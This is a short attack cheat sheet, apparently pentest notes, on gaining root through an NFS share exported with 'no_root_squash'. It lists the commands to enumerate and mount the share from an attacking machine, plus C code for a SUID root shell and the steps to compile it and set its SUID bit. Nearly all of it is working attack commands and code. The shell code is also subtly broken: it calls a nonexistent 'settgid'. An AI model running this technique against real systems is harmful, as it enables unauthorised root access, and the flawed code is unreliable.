Check NFS Config

```
cat /etc/exports
```

If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

Start by enumerating mountable shares from our attacking machine:

```
showmount -e ip
```

Mount one of the “no_root_squash” shares to our attacking machine and start building our executable:

```
mkdir /tmp/dirname

mount -o rw ip:/backups /tmp/dirname
```

If able to set SUID bits, a simple exec to fun /bin/bash will get the job done:

```
int main()
{ settgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

Once we compile the code we will set the SUID bit:

```
gcc nfs.c -o nfs -w

chmod +s nfs
```
